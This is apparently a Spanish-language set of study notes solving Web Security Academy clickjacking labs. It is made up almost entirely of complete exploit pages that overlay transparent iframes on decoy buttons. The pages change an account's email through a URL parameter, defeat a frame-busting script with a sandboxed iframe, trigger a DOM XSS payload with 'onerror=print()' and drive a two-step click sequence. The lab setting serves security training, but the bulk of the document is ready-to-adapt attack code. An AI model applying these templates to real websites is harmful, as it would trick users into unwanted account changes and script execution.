El clickjacking (o secuestro de clics) es un tipo de ataque en el que un usuario malintencionado engaña a los usuarios para que hagan clic en algo diferente a lo que perciben, con el objetivo de realizar acciones no deseadas o maliciosas en un sitio web. El ataque funciona mediante la superposición de un elemento transparente o casi transparente sobre un enlace o botón que el usuario realmente quiere hacer clic. Al hacerlo, el usuario termina haciendo clic en el elemento invisible controlado por el atacante.

## Clickjacking básico con protección de token CSRF

![[01.ClickJacking_Basico.png]]

```css
<style>
    iframe {
        position:relative;
        width:900;
        height: 600;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:523;
        left:60;
        z-index: 1;
    }
button.button{
            border: none;
            user-select: none;
            background-color: #159c80;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            padding: 7px 1em;
            text-align: center;
            text-decoration: none !important;
            white-space: nowrap;
            min-width: 120px;
            border-radius: 25px;
        }
</style>
<div>
<button class="button">Click me</button>
</div>
<iframe src="https://0a2700c10326ef7b80c2304300bc00b7.web-security-academy.net/my-account?id=wiener"></iframe>
```

![[02.ClickJacking_Basico.png]]

# Clickjacking con datos de entrada de formulario precargados desde un parámetro de URL

![[01.Clickjacking_ParametroURL.png]]

```html
<!DOCTYPE html>
<html lang="en">
<body>
    <style>
        iframe {
            position:relative;
            width: 500px;
            height: 700px;
            opacity: 0.1;
            z-index: 2;
        }
        div {
            position:absolute;
            top: 440.5px;
            left: 45px;;
            z-index: 1;
        }
        button.buttom{
            border: none;
            user-select: none;
            background-color: #159c80;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            padding: 7px 1em;
            text-align: center;
            text-decoration: none !important;
            white-space: nowrap;
            min-width: 120px;
            border-radius: 25px;
        }
    </style>
    <div>
        <button class="buttom" type="submit">Click me</button>
    </div>
    <iframe src="https://0a8b006103ca2bcb83f5c33600a90017.web-security-academy.net/my-account?email=hacker@gmail.com"></iframe>    
</body>
</html>
```

![[02.Clickjacking_ParametrosURL.png]]

## Clickjacking con un script de destrucción de fotogramas

![[01.ClickJacking_DescripcionDeFotogramas.png]]

**`sandbox="allow-forms"`**: Este atributo agrega restricciones de seguridad al iframe. En este caso, solo se permite el envío de formularios desde dentro del iframe. Todas las demás acciones (como ejecutar scripts, abrir ventanas emergentes, etc.) están restringidas.

```html
<!DOCTYPE html>
<html lang="en">
<body>
    <style>
        iframe {
            position:relative;
            width: 500px;
            height: 700px;
            opacity: 0.1;
            z-index: 2;
        }
        div {
            position:absolute;
            top: 440.5px;
            left: 45px;;
            z-index: 1;
        }
        button.buttom{
            border: none;
            user-select: none;
            background-color: #159c80;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            padding: 7px 1em;
            text-align: center;
            text-decoration: none !important;
            white-space: nowrap;
            min-width: 120px;
            border-radius: 25px;
        }
    </style>
    <div>
        <button class="buttom">Click me</button>
    </div>

    <iframe sandbox="allow-forms" src="https://0a8c004a04ac788e825dfb88003100fb.web-security-academy.net/my-account?email=hacker@gmail.com"></iframe>    
</body>
</html>
```

![[02.ClickJacking_DescripcionDeFotogramas.png]]

# Explotación de vulnerabilidad de clickjacking para activar XSS basado en DOM

![[01.ClickJacking_DOM.png]]

```css
<style>
	iframe {
		position:relative;
		width:900;
		height: 300;
		opacity:0.01;
		z-index: 2;
	}

	div {
		position:absolute;
		top:210;
		left:45;
		z-index: 1;
	}
button.buttom{
            border: none;
            user-select: none;
            background-color: #159c80;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            padding: 7px 1em;
            text-align: center;
            text-decoration: none !important;
            white-space: nowrap;
            min-width: 120px;
            border-radius: 25px;
        }
</style>
<div>
<button class="buttom">Click me</button></div>
<iframe
src="https://Tulaboratorio.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

![[02.ClickJacking_DOM.png]]
![[03.ClickJacking_DOM.png]]

## Secuestro de clicks en varios pasos

![[01.Clickjacking_Pasos.png]]
```css
<style>
	iframe {
		position:relative;
		width:900;
		height: 550;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:490;
		left:80;
		z-index: 1;
	}
   .secondClick {
		top:290;
		left:230;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a750034049b6e858135a2d300e700c0.web-security-academy.net/my-account"></iframe>
```
![[02.Clickjacking_Pasos.png]]
![[03.Clickjacking_Pasos.png]]
